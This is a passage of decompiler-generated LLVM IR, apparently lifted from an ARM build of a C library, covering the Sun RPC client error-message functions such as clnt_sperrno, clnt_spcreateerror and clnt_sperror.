  %v2_1ba18 = icmp eq i8 %v3_1ba0c, 0
  br i1 %v2_1ba18, label %dec_label_pc_1ba58, label %dec_label_pc_1ba20

dec_label_pc_1ba20:                               ; preds = %bb26
  %v2_1ba20 = inttoptr i32 %v1_1b9ec to i8*
  %v3_1ba20 = load i8, i8* %v2_1ba20, align 1
  %v4_1ba20 = zext i8 %v3_1ba20 to i32
  %v9_1ba24 = icmp eq i32 %v4_1ba20, %v1_1b964
  br i1 %v9_1ba24, label %dec_label_pc_1ba2c, label %dec_label_pc_1ba34

dec_label_pc_1ba2c:                               ; preds = %dec_label_pc_1ba20
  store i32 %v6_1b960, i32* @r5, align 4
  store i32 %v9_1b960, i32* @r6, align 4
  ret i32 %v1_1b9ec

dec_label_pc_1ba34:                               ; preds = %dec_label_pc_1ba20
  %v2_1ba34 = icmp eq i8 %v3_1ba20, 0
  br i1 %v2_1ba34, label %dec_label_pc_1ba58, label %dec_label_pc_1ba3c

dec_label_pc_1ba3c:                               ; preds = %dec_label_pc_1ba34
  %v2_1ba3c = inttoptr i32 %v1_1b9f4 to i8*
  %v3_1ba3c = load i8, i8* %v2_1ba3c, align 1
  %v4_1ba3c = zext i8 %v3_1ba3c to i32
  %v9_1ba40 = icmp eq i32 %v4_1ba3c, %v1_1b964
  br i1 %v9_1ba40, label %dec_label_pc_1ba48, label %dec_label_pc_1ba50

dec_label_pc_1ba48:                               ; preds = %dec_label_pc_1ba3c
  store i32 %v6_1b960, i32* @r5, align 4
  store i32 %v9_1b960, i32* @r6, align 4
  ret i32 %v1_1b9f4

dec_label_pc_1ba50:                               ; preds = %dec_label_pc_1ba3c
  %v2_1ba50 = icmp eq i8 %v3_1ba3c, 0
  br i1 %v2_1ba50, label %dec_label_pc_1ba58, label %dec_label_pc_1b998

dec_label_pc_1ba58:                               ; preds = %bb24, %dec_label_pc_1ba50, %dec_label_pc_1ba34, %bb26, %dec_label_pc_1ba04
  store i32 %v6_1b960, i32* @r5, align 4
  store i32 %v9_1b960, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1b998, { 1, 0 }
  uselistorder i32 %v2_1b998, { 0, 2, 1 }
  uselistorder i32 %v0_1b9fc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1b98c, { 1, 0 }
  uselistorder i32 %v1_1b984, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_1b964, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_1b960, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_1b960, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 0, 1, 4, 2, 3 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ba58, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1b9e0, { 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
entry:
  %v1_1ba74.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1ba70

dec_label_pc_1ba70:                               ; preds = %entry, %dec_label_pc_1ba90
  %v1_1ba7c6 = phi i32 [ 0, %entry ], [ %v1_1ba90, %dec_label_pc_1ba90 ]
  %v4_1ba70 = mul i32 %v1_1ba7c6, 8
  %v5_1ba70 = add i32 %v4_1ba70, ptrtoint (i32* @global_var_1e0c0.1059 to i32)
  %v6_1ba70 = inttoptr i32 %v5_1ba70 to i32*
  %v7_1ba70 = load i32, i32* %v6_1ba70, align 4
  %v9_1ba74 = icmp eq i32 %v7_1ba70, %v1_1ba74.pre
  br i1 %v9_1ba74, label %dec_label_pc_1ba7c, label %dec_label_pc_1ba90

dec_label_pc_1ba7c:                               ; preds = %dec_label_pc_1ba70
  %v1_1ba80 = add i32 %v4_1ba70, add (i32 ptrtoint (i32* @global_var_1e0c0.1059 to i32), i32 4)
  %v2_1ba80 = inttoptr i32 %v1_1ba80 to i32*
  %v3_1ba80 = load i32, i32* %v2_1ba80, align 4
  %v2_1ba88 = add i32 %v3_1ba80, ptrtoint ([13 x i8]* @global_var_1e150.1057 to i32)
  ret i32 %v2_1ba88

dec_label_pc_1ba90:                               ; preds = %dec_label_pc_1ba70
  %v1_1ba90 = add i32 %v1_1ba7c6, 1
  %tmp = icmp ult i32 %v1_1ba90, 18
  br i1 %tmp, label %dec_label_pc_1ba70, label %dec_label_pc_1baa0

dec_label_pc_1baa0:                               ; preds = %dec_label_pc_1ba90
  ret i32 ptrtoint ([26 x i8]* @global_var_1df10.1061 to i32)

; uselistorder directives
  uselistorder i32 %v1_1ba7c6, { 1, 0 }
  uselistorder label %dec_label_pc_1ba70, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v0_1bab4 = load i32, i32* @lr, align 4
  %v0_1bab8 = call i32 @__rpc_thread_variables()
  %v1_1babc = add i32 %v0_1bab8, 156
  %v2_1babc = inttoptr i32 %v1_1babc to i32*
  %v3_1babc = load i32, i32* %v2_1babc, align 4
  store i32 %v3_1babc, i32* @r0, align 4
  store i32 %v0_1bab4, i32* @lr, align 4
  %v0_1bac4 = call i32 @free()
  ret i32 %v0_1bac4

; uselistorder directives
  uselistorder i32 ()* @free, { 42, 37, 40, 23, 22, 21, 20, 19, 18, 17, 14, 36, 9, 41, 38, 10, 39, 1, 0, 7, 6, 5, 4, 3, 31, 30, 13, 12, 11, 16, 15, 8, 29, 2, 35, 34, 25, 33, 32, 28, 27, 26, 24 }
}

define i32 @clnt_perrno() local_unnamed_addr {
entry:
  %v0_1bac8 = load i32, i32* @lr, align 4
  %v0_1bacc = call i32 @__GI_clnt_sperrno()
  %v2_1bad4 = load i32, i32* @global_var_2a890, align 4
  store i32 %v0_1bac8, i32* @lr, align 4
  %v2_1badc = call i32 @__GI_fputs(i32 %v0_1bacc, i32 %v2_1bad4)
  %v0_1bae0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bae0, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v2_1badc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @_buf() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_1bae4 = load i32, i32* @r4, align 4
  store i32 %v3_1bae4, i32* %stack_var_-8, align 4
  %v0_1bae8 = call i32 @__rpc_thread_variables()
  store i32 %v0_1bae8, i32* @r4, align 4
  %v1_1baf0 = add i32 %v0_1bae8, 156
  %v2_1baf0 = inttoptr i32 %v1_1baf0 to i32*
  %v3_1baf0 = load i32, i32* %v2_1baf0, align 4
  %v2_1baf4 = icmp eq i32 %v3_1baf0, 0
  br i1 %v2_1baf4, label %dec_label_pc_1bb00, label %dec_label_pc_1bb08

dec_label_pc_1bb00:                               ; preds = %entry
  %v1_1bb00 = call i32 @malloc(i32 256)
  %v1_1bb04 = load i32, i32* @r4, align 4
  %v2_1bb04 = add i32 %v1_1bb04, 156
  %v3_1bb04 = inttoptr i32 %v2_1bb04 to i32*
  store i32 %v1_1bb00, i32* %v3_1bb04, align 4
  %v0_1bb08.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bb08

dec_label_pc_1bb08:                               ; preds = %entry, %dec_label_pc_1bb00
  %v0_1bb08 = phi i32 [ %v0_1bae8, %entry ], [ %v0_1bb08.pre, %dec_label_pc_1bb00 ]
  %v1_1bb08 = add i32 %v0_1bb08, 156
  %v2_1bb08 = inttoptr i32 %v1_1bb08 to i32*
  %v3_1bb08 = load i32, i32* %v2_1bb08, align 4
  %v2_1bb0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bb0c, i32* @r4, align 4
  ret i32 %v3_1bb08

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 21, 24, 9, 6, 5, 7, 23, 22, 20, 4, 3, 19, 16, 25, 2, 1, 0, 15, 17, 18, 8, 14, 13, 12, 11, 10 }
  uselistorder i32 156, { 1, 2, 3, 0, 4 }
  uselistorder i32 ()* @__rpc_thread_variables, { 13, 18, 6, 17, 16, 15, 14, 12, 2, 0, 4, 11, 3, 10, 1, 9, 5, 8, 7 }
  uselistorder label %dec_label_pc_1bb08, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-1044 = alloca i32, align 4
  %v3_1bb10 = load i32, i32* @r4, align 4
  %v6_1bb10 = load i32, i32* @r5, align 4
  %v9_1bb10 = load i32, i32* @r6, align 4
  %v12_1bb10 = load i32, i32* @r7, align 4
  %v2_1bb14 = ptrtoint i32* %stack_var_-1044 to i32
  %v0_1bb18 = load i32, i32* @r0, align 4
  store i32 %v0_1bb18, i32* @r4, align 4
  %v0_1bb1c = call i32 @_buf()
  store i32 %v0_1bb1c, i32* @r6, align 4
  %v2_1bb20 = icmp eq i32 %v0_1bb1c, 0
  br i1 %v2_1bb20, label %dec_label_pc_1bbfc, label %dec_label_pc_1bb28

dec_label_pc_1bb28:                               ; preds = %entry
  %v0_1bb28 = call i32 @__GI___rpc_thread_createerr()
  %v0_1bb2c = load i32, i32* @r4, align 4
  store i32 %v0_1bb28, i32* @r5, align 4
  %v0_1bb38 = load i32, i32* @r6, align 4
  store i32 %v0_1bb38, i32* @r0, align 4
  %v4_1bb3c = call i32 @sprintf(i32 %v0_1bb38, i32 ptrtoint ([5 x i8]* @global_var_1df2c.1064 to i32), i32 %v0_1bb2c)
  %v0_1bb40 = load i32, i32* @r6, align 4
  %v2_1bb40 = add i32 %v0_1bb40, %v4_1bb3c
  store i32 %v2_1bb40, i32* %r4.global-to-local, align 4
  %v0_1bb44 = load i32, i32* @r5, align 4
  %v1_1bb44 = inttoptr i32 %v0_1bb44 to i32*
  %v2_1bb44 = load i32, i32* %v1_1bb44, align 4
  store i32 %v2_1bb44, i32* @r0, align 4
  %v0_1bb48 = call i32 @__GI_clnt_sperrno()
  %v2_1bb54 = inttoptr i32 %v0_1bb48 to i8*
  %v3_1bb54 = call i32 @strcpy(i32 %v2_1bb40, i8* %v2_1bb54)
  %v0_1bb58 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bb58 = inttoptr i32 %v0_1bb58 to i8*
  %v3_1bb5c = call i32 @strlen(i8* %v1_1bb58)
  %v0_1bb60 = load i32, i32* @r5, align 4
  %v1_1bb60 = inttoptr i32 %v0_1bb60 to i32*
  %v2_1bb60 = load i32, i32* %v1_1bb60, align 4
  store i32 %v2_1bb60, i32* %r3.global-to-local, align 4
  %v0_1bb64 = load i32, i32* %r4.global-to-local, align 4
  %v2_1bb64 = add i32 %v0_1bb64, %v3_1bb5c
  store i32 %v2_1bb64, i32* %r4.global-to-local, align 4
  %v7_1bb68 = icmp eq i32 %v2_1bb60, 12
  br i1 %v7_1bb68, label %dec_label_pc_1bbb4, label %dec_label_pc_1bb7c

dec_label_pc_1bb7c:                               ; preds = %dec_label_pc_1bb28
  %v7_1bb7c = icmp eq i32 %v2_1bb60, 14
  br i1 %v7_1bb7c, label %dec_label_pc_1bb84, label %dec_label_pc_1bbec

dec_label_pc_1bb84:                               ; preds = %dec_label_pc_1bb7c
  %v4_1bb84 = call i32 @strcpy(i32 %v2_1bb64, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1df34.1066, i32 0, i32 0))
  %v0_1bb88 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bb88 = inttoptr i32 %v0_1bb88 to i8*
  %v3_1bb8c = call i32 @strlen(i8* %v1_1bb88)
  %v2_1bb90 = add i32 %v0_1bb88, %v3_1bb8c
  store i32 %v2_1bb90, i32* @r4, align 4
  %v0_1bb94 = load i32, i32* @r5, align 4
  %v1_1bb94 = add i32 %v0_1bb94, 4
  %v2_1bb94 = inttoptr i32 %v1_1bb94 to i32*
  %v3_1bb94 = load i32, i32* %v2_1bb94, align 4
  store i32 %v3_1bb94, i32* @r0, align 4
  %v0_1bb98 = call i32 @__GI_clnt_sperrno()
  %v0_1bba0 = load i32, i32* @r4, align 4
  %v2_1bba4 = inttoptr i32 %v0_1bb98 to i8*
  %v3_1bba4 = call i32 @strcpy(i32 %v0_1bba0, i8* %v2_1bba4)
  %v0_1bba8 = load i32, i32* @r4, align 4
  %v1_1bba8 = inttoptr i32 %v0_1bba8 to i8*
  %v3_1bbac = call i32 @strlen(i8* %v1_1bba8)
  br label %dec_label_pc_1bbe8

dec_label_pc_1bbb4:                               ; preds = %dec_label_pc_1bb28
  %v4_1bbb4 = call i32 @strcpy(i32 %v2_1bb64, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1df34.1066, i32 0, i32 0))
  %v0_1bbb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bbb8 = inttoptr i32 %v0_1bbb8 to i8*
  %v3_1bbbc = call i32 @strlen(i8* %v1_1bbb8)
  store i32 1024, i32* @r2, align 4
  %v2_1bbc4 = add i32 %v0_1bbb8, %v3_1bbbc
  store i32 %v2_1bbc4, i32* @r4, align 4
  %v0_1bbcc = load i32, i32* @r5, align 4
  %v1_1bbcc = add i32 %v0_1bbcc, 8
  %v2_1bbcc = inttoptr i32 %v1_1bbcc to i32*
  %v3_1bbcc = load i32, i32* %v2_1bbcc, align 4
  store i32 %v3_1bbcc, i32* @r0, align 4
  %v3_1bbd0 = call i32 @__GI___glibc_strerror_r(i32 %v3_1bbcc, i32 %v2_1bb14, i32 1024)
  %v0_1bbd4 = load i32, i32* @r4, align 4
  %v2_1bbdc = bitcast i32* %stack_var_-1044 to i8*
  %v3_1bbdc = call i32 @strcpy(i32 %v0_1bbd4, i8* %v2_1bbdc)
  %v0_1bbe0 = load i32, i32* @r4, align 4
  %v1_1bbe0 = inttoptr i32 %v0_1bbe0 to i8*
  %v3_1bbe4 = call i32 @strlen(i8* %v1_1bbe0)
  br label %dec_label_pc_1bbe8

dec_label_pc_1bbe8:                               ; preds = %dec_label_pc_1bb84, %dec_label_pc_1bbb4
  %storemerge = phi i32 [ %v3_1bbe4, %dec_label_pc_1bbb4 ], [ %v3_1bbac, %dec_label_pc_1bb84 ]
  %v0_1bbe8 = load i32, i32* @r4, align 4
  %v2_1bbe8 = add i32 %v0_1bbe8, %storemerge
  store i32 %v2_1bbe8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1bbec

dec_label_pc_1bbec:                               ; preds = %dec_label_pc_1bb7c, %dec_label_pc_1bbe8
  %v2_1bbf0 = phi i32 [ %v2_1bb64, %dec_label_pc_1bb7c ], [ %v2_1bbe8, %dec_label_pc_1bbe8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1bbf0 = add i32 %v2_1bbf0, 1
  %v4_1bbf0 = inttoptr i32 %v3_1bbf0 to i8*
  store i8 0, i8* %v4_1bbf0, align 1
  %v0_1bbf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bbf4 = add i32 %v0_1bbf4, 10
  store i32 %v1_1bbf4, i32* %r3.global-to-local, align 4
  %v1_1bbf8 = trunc i32 %v1_1bbf4 to i8
  %v2_1bbf8 = load i32, i32* %r4.global-to-local, align 4
  %v3_1bbf8 = inttoptr i32 %v2_1bbf8 to i8*
  store i8 %v1_1bbf8, i8* %v3_1bbf8, align 1
  %v0_1bbfc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1bbfc

dec_label_pc_1bbfc:                               ; preds = %entry, %dec_label_pc_1bbec
  %v0_1bbfc = phi i32 [ 0, %entry ], [ %v0_1bbfc.pre, %dec_label_pc_1bbec ]
  store i32 %v3_1bb10, i32* @r4, align 4
  store i32 %v6_1bb10, i32* @r5, align 4
  store i32 %v9_1bb10, i32* @r6, align 4
  store i32 %v12_1bb10, i32* @r7, align 4
  ret i32 %v0_1bbfc

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1bbfc, { 1, 0 }
  uselistorder label %dec_label_pc_1bbec, { 1, 0 }
  uselistorder label %dec_label_pc_1bbe8, { 1, 0 }
}

define i32 @clnt_pcreateerror() local_unnamed_addr {
entry:
  %v0_1bc10 = load i32, i32* @lr, align 4
  %v0_1bc14 = call i32 @clnt_spcreateerror()
  %v2_1bc1c = load i32, i32* @global_var_2a890, align 4
  store i32 %v0_1bc10, i32* @lr, align 4
  %v2_1bc24 = call i32 @__GI_fputs(i32 %v0_1bc14, i32 %v2_1bc1c)
  %v0_1bc28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bc28, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v2_1bc24

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-1056 = alloca i32, align 4
  %v3_1bc2c = load i32, i32* @r4, align 4
  %v6_1bc2c = load i32, i32* @r5, align 4
  %v9_1bc2c = load i32, i32* @r6, align 4
  %v12_1bc2c = load i32, i32* @r7, align 4
  %v2_1bc34 = ptrtoint i32* %stack_var_-1056 to i32
  %v0_1bc38 = load i32, i32* @r0, align 4
  store i32 %v0_1bc38, i32* @r4, align 4
  %v0_1bc3c = load i32, i32* @r1, align 4
  store i32 %v0_1bc3c, i32* @r5, align 4
  %v0_1bc40 = call i32 @_buf()
  store i32 %v0_1bc40, i32* @r7, align 4
  %v2_1bc44 = icmp eq i32 %v0_1bc40, 0
  br i1 %v2_1bc44, label %dec_label_pc_1bddc, label %dec_label_pc_1bc4c

dec_label_pc_1bc4c:                               ; preds = %entry
  %v0_1bc4c = load i32, i32* @r4, align 4
  %v1_1bc4c = add i32 %v0_1bc4c, 4
  %v2_1bc4c = inttoptr i32 %v1_1bc4c to i32*
  %v3_1bc4c = load i32, i32* %v2_1bc4c, align 4
  store i32 %v3_1bc4c, i32* %r3.global-to-local, align 4
  store i32 113760, i32* @lr, align 4
  %v1_1bc5c = add i32 %v3_1bc4c, 8
  %v2_1bc5c = inttoptr i32 %v1_1bc5c to i32*
  %v3_1bc5c = load i32, i32* %v2_1bc5c, align 4
  call void @__pseudo_branch(i32 %v3_1bc5c)
  %v0_1bc60 = load i32, i32* @r5, align 4
  %v0_1bc68 = load i32, i32* @r7, align 4
  store i32 %v0_1bc68, i32* @r0, align 4
  %v4_1bc6c = call i32 @sprintf(i32 %v0_1bc68, i32 ptrtoint ([5 x i8]* @global_var_1df2c.1064 to i32), i32 %v0_1bc60)
  %v0_1bc70 = load i32, i32* @r7, align 4
  %v2_1bc70 = add i32 %v0_1bc70, %v4_1bc6c
  store i32 %v2_1bc70, i32* @r4, align 4
  %v3_1bc74 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1bc74, i32* @r0, align 4
  %v0_1bc78 = call i32 @__GI_clnt_sperrno()
  %v0_1bc80 = load i32, i32* @r4, align 4
  %v2_1bc84 = inttoptr i32 %v0_1bc78 to i8*
  %v3_1bc84 = call i32 @strcpy(i32 %v0_1bc80, i8* %v2_1bc84)
  %v0_1bc88 = load i32, i32* @r4, align 4
  %v1_1bc88 = inttoptr i32 %v0_1bc88 to i8*
  %v3_1bc8c = call i32 @strlen(i8* %v1_1bc88)
  %v3_1bc90 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1bc90, i32* %r3.global-to-local, align 4
  %v0_1bc94 = load i32, i32* @r4, align 4
  %v2_1bc94 = add i32 %v0_1bc94, %v3_1bc8c
  store i32 %v2_1bc94, i32* @r5, align 4
  switch i32 %v3_1bc90, label %dec_label_pc_1bdb4 [
    i32 0, label %dec_label_pc_1bdcc
    i32 1, label %dec_label_pc_1bdcc
    i32 2, label %dec_label_pc_1bdcc
    i32 3, label %dec_label_pc_1bcec
    i32 4, label %dec_label_pc_1bcec
    i32 5, label %dec_label_pc_1bdcc
    i32 6, label %dec_label_pc_1bdbc
    i32 7, label %dec_label_pc_1bd2c
    i32 8, label %dec_label_pc_1bdcc
    i32 9, label %dec_label_pc_1bdbc
    i32 10, label %dec_label_pc_1bdcc
    i32 11, label %dec_label_pc_1bdcc
    i32 12, label %dec_label_pc_1bdcc
    i32 13, label %dec_label_pc_1bdcc
    i32 14, label %dec_label_pc_1bdcc
    i32 15, label %dec_label_pc_1bdcc
    i32 16, label %dec_label_pc_1bdcc
    i32 17, label %dec_label_pc_1bdcc
  ]

dec_label_pc_1bcec:                               ; preds = %dec_label_pc_1bc4c, %dec_label_pc_1bc4c
  store i32 1024, i32* @r2, align 4
  store i32 %tmp13, i32* @r0, align 4
  %v3_1bcf8 = call i32 @__GI___glibc_strerror_r(i32 %tmp13, i32 %v2_1bc34, i32 1024)
  %v0_1bd00 = load i32, i32* @r5, align 4
  store i32 %v0_1bd00, i32* @r0, align 4
  store i32 %v2_1bc34, i32* @r4, align 4
  %v4_1bd10 = call i32 @sprintf(i32 %v0_1bd00, i32 ptrtoint ([13 x i8]* @global_var_1df38.1071 to i32), i32 %v2_1bc34)
  br label %dec_label_pc_1bdc8

dec_label_pc_1bd18:                               ; preds = %dec_label_pc_1bd38
  store i32 %v5_1bd38, i32* %r3.global-to-local, align 4
  %v1_1bd1c = add i32 %v4_1bd38, add (i32 ptrtoint (i32* @global_var_1dfb8.1075 to i32), i32 4)
  %v2_1bd1c = inttoptr i32 %v1_1bd1c to i32*
  %v3_1bd1c = load i32, i32* %v2_1bd1c, align 4
  store i32 ptrtoint ([18 x i8]* @global_var_1dff8.1073 to i32), i32* %r3.global-to-local, align 4
  %v2_1bd24 = add i32 %v3_1bd1c, ptrtoint ([18 x i8]* @global_var_1dff8.1073 to i32)
  br label %dec_label_pc_1bd58

dec_label_pc_1bd2c:                               ; preds = %dec_label_pc_1bc4c
  br label %dec_label_pc_1bd38

dec_label_pc_1bd38:                               ; preds = %dec_label_pc_1bd2c, %dec_label_pc_1bd44
  %v1_1bd1825 = phi i32 [ 0, %dec_label_pc_1bd2c ], [ %v1_1bd44, %dec_label_pc_1bd44 ]
  %v4_1bd38 = mul i32 %v1_1bd1825, 8
  %v5_1bd38 = add i32 %v4_1bd38, ptrtoint (i32* @global_var_1dfb8.1075 to i32)
  %v6_1bd38 = inttoptr i32 %v5_1bd38 to i32*
  %v7_1bd38 = load i32, i32* %v6_1bd38, align 4
  store i32 %v7_1bd38, i32* %r3.global-to-local, align 4
  %v9_1bd3c = icmp eq i32 %v7_1bd38, %tmp13
  br i1 %v9_1bd3c, label %dec_label_pc_1bd18, label %dec_label_pc_1bd44

dec_label_pc_1bd44:                               ; preds = %dec_label_pc_1bd38
  %v1_1bd44 = add i32 %v1_1bd1825, 1
  %tmp = icmp ult i32 %v1_1bd44, 8
  br i1 %tmp, label %dec_label_pc_1bd38, label %dec_label_pc_1bd58.loopexit

dec_label_pc_1bd58.loopexit:                      ; preds = %dec_label_pc_1bd44
  br label %dec_label_pc_1bd58

dec_label_pc_1bd58:                               ; preds = %dec_label_pc_1bd58.loopexit, %dec_label_pc_1bd18
  %storemerge2 = phi i32 [ %v2_1bd24, %dec_label_pc_1bd18 ], [ 0, %dec_label_pc_1bd58.loopexit ]
  store i32 %storemerge2, i32* @r6, align 4
  %v4_1bd60 = call i32 @strcpy(i32 %v2_1bc94, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1df70.1077, i32 0, i32 0))
  %v0_1bd64 = load i32, i32* @r5, align 4
  %v1_1bd64 = inttoptr i32 %v0_1bd64 to i8*
  %v3_1bd68 = call i32 @strlen(i8* %v1_1bd64)
  %v0_1bd6c = load i32, i32* @r6, align 4
  %v2_1bd6c = icmp eq i32 %v0_1bd6c, 0
  %v0_1bd70 = load i32, i32* @r5, align 4
  %v2_1bd70 = add i32 %v0_1bd70, %v3_1bd68
  store i32 %v2_1bd70, i32* @r4, align 4
  br i1 %v2_1bd6c, label %dec_label_pc_1bd90, label %dec_label_pc_1bd78

dec_label_pc_1bd78:                               ; preds = %dec_label_pc_1bd58
  %v2_1bd80 = inttoptr i32 %v0_1bd6c to i8*
  %v3_1bd80 = call i32 @strcpy(i32 %v2_1bd70, i8* %v2_1bd80)
  %v0_1bd84 = load i32, i32* @r4, align 4
  %v1_1bd84 = inttoptr i32 %v0_1bd84 to i8*
  %v3_1bd88 = call i32 @strlen(i8* %v1_1bd84)
  br label %dec_label_pc_1bda0

dec_label_pc_1bd90:                               ; preds = %dec_label_pc_1bd58
  store i32 %v2_1bd70, i32* @r0, align 4
  %v4_1bd9c = call i32 @sprintf(i32 %v2_1bd70, i32 ptrtoint ([36 x i8]* @global_var_1df7c.1079 to i32), i32 %tmp13)
  br label %dec_label_pc_1bda0

dec_label_pc_1bda0:                               ; preds = %dec_label_pc_1bd78, %dec_label_pc_1bd90
  %storemerge3 = phi i32 [ %v4_1bd9c, %dec_label_pc_1bd90 ], [ %v3_1bd88, %dec_label_pc_1bd78 ]
  %v0_1bda0 = load i32, i32* @r4, align 4
  %v2_1bda0 = add i32 %v0_1bda0, %storemerge3
  store i32 %v2_1bda0, i32* @r5, align 4
  br label %dec_label_pc_1bdcc

dec_label_pc_1bdb4:                               ; preds = %dec_label_pc_1bc4c
  br label %dec_label_pc_1bdbc

dec_label_pc_1bdbc:                               ; preds = %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bdb4
  %storemerge5 = phi i32 [ ptrtoint ([21 x i8]* @global_var_1dfa0.1083 to i32), %dec_label_pc_1bdb4 ], [ ptrtoint ([40 x i8]* @global_var_1df48.1081 to i32), %dec_label_pc_1bc4c ], [ ptrtoint ([40 x i8]* @global_var_1df48.1081 to i32), %dec_label_pc_1bc4c ]
  store i32 %v2_1bc94, i32* @r0, align 4
  %v3_1bdc4 = call i32 @sprintf(i32 %v2_1bc94, i32 %storemerge5, i32 %tmp13)
  br label %dec_label_pc_1bdc8

dec_label_pc_1bdc8:                               ; preds = %dec_label_pc_1bcec, %dec_label_pc_1bdbc
  %storemerge4 = phi i32 [ %v4_1bd10, %dec_label_pc_1bcec ], [ %v3_1bdc4, %dec_label_pc_1bdbc ]
  %v0_1bdc8 = load i32, i32* @r5, align 4
  %v2_1bdc8 = add i32 %v0_1bdc8, %storemerge4
  store i32 %v2_1bdc8, i32* @r5, align 4
  br label %dec_label_pc_1bdcc

dec_label_pc_1bdcc:                               ; preds = %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bc4c, %dec_label_pc_1bda0, %dec_label_pc_1bdc8
  %v2_1bdd0 = phi i32 [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bc94, %dec_label_pc_1bc4c ], [ %v2_1bda0, %dec_label_pc_1bda0 ], [ %v2_1bdc8, %dec_label_pc_1bdc8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1bdd0 = add i32 %v2_1bdd0, 1
  %v4_1bdd0 = inttoptr i32 %v3_1bdd0 to i8*
  store i8 0, i8* %v4_1bdd0, align 1
  %v0_1bdd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bdd4 = add i32 %v0_1bdd4, 10
  store i32 %v1_1bdd4, i32* %r3.global-to-local, align 4
  %v1_1bdd8 = trunc i32 %v1_1bdd4 to i8
  %v2_1bdd8 = load i32, i32* @r5, align 4
  %v3_1bdd8 = inttoptr i32 %v2_1bdd8 to i8*
  store i8 %v1_1bdd8, i8* %v3_1bdd8, align 1
  %v0_1bddc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1bddc

dec_label_pc_1bddc:                               ; preds = %entry, %dec_label_pc_1bdcc
  %v0_1bddc = phi i32 [ 0, %entry ], [ %v0_1bddc.pre, %dec_label_pc_1bdcc ]
  store i32 %v3_1bc2c, i32* @r4, align 4
  store i32 %v6_1bc2c, i32* @r5, align 4
  store i32 %v9_1bc2c, i32* @r6, align 4
  store i32 %v12_1bc2c, i32* @r7, align 4
  ret i32 %v0_1bddc

; uselistorder directives
  uselistorder i32 %v2_1bd70, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1bd38, { 1, 0 }
  uselistorder i32 %v4_1bd38, { 1, 0 }
  uselistorder i32 %v1_1bd1825, { 1, 0 }
  uselistorder i32 %v2_1bc94, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16 }
  uselistorder i32 %v2_1bc34, { 1, 0, 2 }
  uselistorder i32 %tmp13, { 4, 3, 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 0, 1, 2, 6, 7 }
